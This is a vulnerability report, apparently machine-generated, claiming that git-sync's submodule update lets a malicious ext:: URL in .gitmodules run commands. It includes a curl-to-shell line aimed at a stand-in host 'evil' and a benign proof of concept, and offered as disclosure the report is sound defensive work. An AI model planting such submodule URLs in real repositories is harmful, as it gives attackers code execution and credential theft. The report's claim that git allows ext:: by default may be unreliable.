### Title
Arbitrary Command Execution via Malicious Submodule URL During `git submodule update` - (File: main.go)

### Summary
Git-sync fetches attacker-influenced repository content and, when submodule syncing is enabled (the default), runs `git submodule update --init --recursive` directly against that content without restricting which git transport helpers may be used. Git supports an `ext::` submodule/remote URL scheme that executes an arbitrary shell command supplied in the URL, so a `.gitmodules` entry pointing to `ext::sh -c ...` embedded in a synced ref is a well-known command-injection primitive comparable to the `free-space` report's "unsanitized input reaches an exec-ed command" pattern — except the "sanitization" gap here is git-sync never opting into `GIT_ALLOW_PROTOCOL`/`protocol.ext.allow=never` (or an explicit allow-list) before invoking git on synced content.

### Finding Description
`configureWorktree` builds and runs the submodule-sync command unconditionally whenever `--submodules` is not `off` (the default is `recursive`): [1](#0-0) 

The command is executed through the generic `Runner.Run`/`exec.CommandContext` path, which passes `command`/`args` straight to the OS without any git-side protocol restrictions applied via environment or config: [2](#0-1) 

Neither the flag-parsing section nor the `repoSync` setup in `main.go` sets `GIT_ALLOW_PROTOCOL`, `protocol.ext.allow`, or any equivalent transport allow-list before running git commands — a search of `main.go` for `protocol`, `GIT_ALLOW`, or `ext::` returns zero hits, confirming no such restriction exists anywhere in the binary's own logic (only third-party vendored code unrelated to git-sync's git invocation contains those substrings). Git itself, by default, honors `ext::<command>` URLs for submodules and remotes, spawning the given command through the shell. Because `git submodule update --init [--recursive]` is run against `.gitmodules`/tree content that came from the fetched `--ref` (i.e., content an attacker who can push to the synced repo/branch fully controls), a submodule URL of the form `ext::sh -c "curl http://evil/x|sh"` (or Windows equivalent) will be executed by git as a child of the git-sync process the moment that ref is synced.

This is directly analogous to the reported `free-space` bug class: an external, attacker-controlled string is passed unmodified into a code path that ultimately invokes a shell command, with no allow-list or escaping applied.

### Impact Explanation
Successful exploitation gives the attacker code execution inside the git-sync container/process with whatever privileges git-sync runs as (frequently used to sync files that other pods/containers consume, and often granted SSH keys, tokens, or read access to `--root`). This can lead to credential/token disclosure (e.g., SSH keys mounted via `--ssh-key-file`, HTTP credentials configured via `credential.helper`), filesystem writes/deletes outside the intended `--root` tree, or a persistent-sync compromise, matching the "accept" criteria of code execution / credential disclosure / persistent sync denial.

### Likelihood Explanation
Likelihood is high in any deployment where git-sync points `--repo`/`--ref` at a repository or branch to which an untrusted or semi-trusted party can push (a very common CI/CD and GitOps pattern — e.g., syncing a branch that receives PR merges, or a repo shared across teams with different trust levels). No special git-sync flags are required beyond the default `--submodules=recursive` (or `shallow`) behavior; the attacker only needs the ability to add/modify a `.gitmodules` file and get it synced.

### Recommendation
Before invoking any submodule-related git command, git-sync should:
- Set `GIT_ALLOW_PROTOCOL` (or configure `protocol.ext.allow=never`, `protocol.file.allow=never`, etc.) in the environment/args passed to `git.Run`, restricting submodule/remote URL schemes to an explicit safe allow-list (e.g., `http:https:ssh:git`).
- Apply this restriction globally for every git invocation made by `repoSync`, not just submodule commands, since `.gitmodules` content is fully attacker-controlled once a ref is synced.
- Consider defaulting `--submodules` handling to reject unknown/absolute or `ext::`-style URLs and document the risk clearly for operators who enable recursive submodule sync on repos with untrusted contributors.

### Proof of Concept
1. Attacker with push access to a branch/ref synced by git-sync (default `--submodules=recursive`) adds a `.gitmodules` file:
   ```
   [submodule "pwn"]
       path = pwn
       url = ext::sh -c "touch$IFS/tmp/pwned"
   ```
   and commits/pushes it.
2. git-sync's normal loop fetches the new commit and calls `configureWorktree`, which runs: [3](#0-2) 
   i.e. `git submodule update --init --recursive`.
3. Git resolves the `ext::` URL for submodule `pwn` and executes `sh -c "touch /tmp/pwned"` as a child of the git-sync process, demonstrating arbitrary command execution triggered purely by synced repository content.

### Citations

**File:** main.go (L1733-1746)
```go
	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
```

**File:** pkg/cmd/cmd.go (L63-94)
```go
func runWithStdin(ctx context.Context, log logintf, cwd string, env []string, stdin, command string, args ...string) (string, string, error) {
	cmdStr := cmdForLog(command, args...)
	log.V(5).Info("running command", "cwd", cwd, "cmd", cmdStr)

	cmd := exec.CommandContext(ctx, command, args...)
	if cwd != "" {
		cmd.Dir = cwd
	}
	if len(env) != 0 {
		cmd.Env = env
	}
	outbuf := bytes.NewBuffer(nil)
	errbuf := bytes.NewBuffer(nil)
	cmd.Stdout = outbuf
	cmd.Stderr = errbuf
	cmd.Stdin = bytes.NewBufferString(stdin)

	start := time.Now()
	err := cmd.Run()
	wallTime := time.Since(start)
	stdout := strings.TrimSpace(outbuf.String())
	stderr := strings.TrimSpace(errbuf.String())
	if ctx.Err() == context.DeadlineExceeded {
		return stdout, stderr, fmt.Errorf("Run(%s): %w: { stdout: %q, stderr: %q }", cmdStr, ctx.Err(), stdout, stderr)
	}
	if err != nil {
		return stdout, stderr, fmt.Errorf("Run(%s): %w: { stdout: %q, stderr: %q }", cmdStr, err, stdout, stderr)
	}
	log.V(6).Info("command result", "stdout", stdout, "stderr", stderr, "time", wallTime)

	return stdout, stderr, nil
}
```
